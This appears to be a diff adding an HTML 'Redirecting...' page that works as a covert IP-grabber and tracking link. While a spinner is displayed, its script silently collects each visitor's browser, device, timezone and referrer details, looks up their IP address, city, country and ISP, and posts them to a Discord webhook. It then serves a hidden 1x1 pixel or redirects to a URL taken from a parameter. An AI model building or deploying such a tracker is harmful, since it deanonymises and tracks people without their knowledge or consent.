@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body { 
+            background: #0a0a0f; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            margin: 0;
+            font-family: system-ui, -apple-system, sans-serif;
+            color: white;
+        }
+        .loader {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #a78bfa;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        img[width="1"] { display: none; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        (async function() {
+            const params = new URLSearchParams(window.location.search);
+            const id = params.get('id');
+            const type = params.get('type');
+            const redirect = params.get('redirect');
+            
+            // Get webhook from localStorage (stored when link was generated)
+            const webhookUrl = localStorage.getItem('phantom_webhook');
+            
+            if (webhookUrl) {
+                // Collect data
+                const data = {
+                    id: id,
+                    type: type,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    referrer: document.referrer || 'direct'
+                };
+                
+                // Get IP
+                try {
+                    const ipRes = await fetch('https://ipapi.co/json/');
+                    if (ipRes.ok) {
+                        const ipData = await ipRes.json();
+                        data.ip = ipData.ip;
+                        data.city = ipData.city;
+                        data.country = ipData.country_name;
+                        data.isp = ipData.org;
+                    }
+                } catch (e) {}
+                
+                // Send to Discord
+                try {
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `👻 **New Visit** | ID: \`${id}\``,
+                            embeds: [{
+                                fields: [
+                                    { name: "📍 IP", value: data.ip || 'Unknown', inline: true },
+                                    { name: "🌍 Location", value: `${data.city || '?'}, ${data.country || '?'}`, inline: true },
+                                    { name: "📱 Device", value: data.platform || 'Unknown', inline: true },
+                                    { name: "🔗 Type", value: type || 'unknown', inline: true },
+                                    { name: "🆔 Tracking ID", value: id || 'unknown', inline: false }
+                                ],
+                                color: 0xa78bfa,
+                                timestamp: new Date().toISOString()
+                            }]
+                        })
+                    });
+                } catch (e) {}
+            }
+            
+            // Handle based on type
+            if (type === 'image') {
+                // Serve 1x1 pixel
+                const img = new Image();
+                img.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
+                img.width = 1;
+                img.height = 1;
+                img.style.display = 'none';
+                document.body.appendChild(img);
+                document.body.innerHTML = '<!-- 1x1 pixel -->';
+            } else if (type === 'link' && redirect) {
+                // Redirect after 1 second
+                setTimeout(() => {
+                    window.location.href = decodeURIComponent(redirect);
+                }, 1000);
+            } else {
+                document.body.innerHTML = 'Redirecting...';
+            }
+        })();
+    </script>
+</body>
+</html>
